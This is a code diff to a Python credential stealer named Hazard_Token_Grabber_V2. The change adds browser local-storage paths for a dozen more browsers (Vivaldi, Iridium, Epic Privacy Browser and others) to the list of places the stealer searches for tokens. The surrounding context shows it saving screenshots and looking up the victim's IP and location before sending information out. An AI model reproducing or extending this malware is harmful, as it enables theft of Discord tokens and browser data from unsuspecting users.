@@ -181,10 +181,22 @@ class Hazard_Token_Grabber_V2:
             'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
             'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
             'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
+            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
+            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
+            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
+            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
+            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
+            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
+            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
+            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
             'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
             'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
+            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
             'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
             'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
         }
 
         for source, path in paths.items():
@@ -253,6 +265,7 @@ class Hazard_Token_Grabber_V2:
         image.save(self.tempfolder + "\\Screenshot.png")
 
     def SendInfo(self):
+        ip = country = city = region = googlemap = "None"
         try:
             data = requests.get("http://ipinfo.io/json").json()
             ip = data['ip']
